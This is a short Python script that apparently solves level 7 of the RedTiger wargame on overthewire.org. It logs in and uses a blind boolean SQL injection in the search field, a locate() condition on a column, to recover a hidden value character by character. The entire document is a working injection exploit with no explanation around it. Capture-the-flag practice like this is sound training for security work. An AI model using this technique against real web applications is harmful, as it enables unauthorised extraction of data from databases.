# -*- coding: utf-8 -*-
import requests
r = requests.Session()
flag = ""
login = {'password': 'dont_shout_at_your_disks***',
         'level7login': 'Login',
         'dosearch': 'search!'}

for x in range(1, 17):
    url = "http://redtiger.labs.overthewire.org/level7.php"

    for i in range(32, 127):
        login["search"] = "google%%' and locate('%s',news.autor COLLATE latin1_general_cs)=%d and '%%'='" % (
            chr(i), x)
        result = r.post(url, data=login)
        if "FRANCISCO" in result.content:
            flag = flag + chr(i)
            break
    print flag
print flag
